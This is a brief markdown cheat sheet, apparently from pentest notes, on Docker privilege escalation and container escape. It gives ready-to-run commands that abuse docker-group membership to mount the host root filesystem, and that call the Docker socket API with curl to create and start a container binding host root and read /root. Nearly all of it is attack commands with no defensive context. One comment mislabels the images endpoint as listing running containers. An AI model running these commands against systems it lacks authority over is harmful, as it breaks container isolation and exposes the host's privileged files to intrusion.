---
title: "Docker"
date: 2024-7-3
tags: ["docker", "privesc", "container", "escape"]
---

---
### Privesc

#### Abuse docker group

```bash
# List images
docker images
```

```bash
# Mount host root filesystem
docker run -v /:/mnt -it image_name bash
```

```bash
# Check
ls /mnt/root
```

### Docker API

```bash
# Show running containers
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```bash
# Create container
curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<image_name>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
```

```bash
# Start container
curl -s -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/start
```

```bash
# Show results
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<container_id>/logs?stderr=1&stdout=1"
```

<br>